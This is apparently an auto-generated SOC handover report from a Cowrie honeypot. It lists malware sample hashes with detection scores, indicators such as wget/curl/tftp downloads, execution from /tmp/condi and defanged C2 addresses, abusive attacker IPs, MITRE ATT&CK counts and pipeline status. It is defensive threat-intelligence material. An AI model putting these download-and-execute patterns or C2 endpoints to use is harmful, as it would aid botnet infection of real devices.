| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `43.172.74[.]146` | US | ACEVILLE PTE.LTD. | **100** ⚠️ | 10 |
| `20.64.105[.]183` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `144.48.6[.]26` | SG | Singapore  Beyotta Network LLP | **100** ⚠️ | 12 |
| `140.83.83[.]72` | JP | Oracle Corporation | **100** ⚠️ | 2 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 18 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `120.202.189[.]21` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 194 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 186 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 421 cases |
| Tool 34  | Credential Extractor        | ✅ 223 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 191 priority case(s) shown individually · 40 recon entry/entries in table (16 group(s) consolidating 199 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T14:11:41Z_
